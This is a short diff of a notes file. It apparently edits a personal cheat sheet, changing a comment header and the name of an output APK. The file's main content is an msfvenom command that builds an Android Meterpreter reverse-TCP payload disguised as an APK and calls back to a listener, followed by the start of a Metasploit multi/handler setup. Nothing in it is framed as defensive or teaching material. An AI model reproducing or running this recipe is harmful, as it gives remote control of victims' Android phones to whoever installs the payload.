@@ -1,8 +1,8 @@
-# ###################### 
-# [+] COMMENDS : 
-###################### 
+#  
+# [+] COMMENDS : whats up guys !!!!
+# 
 Payload 
-msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.32 LPORT=2342 R > /root/Desktop/fatsio.apk 
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.32 LPORT=2342 R > /root/Desktop/satyaenki.apk 
 
 metasploit 
 use exploit/multi/handler 
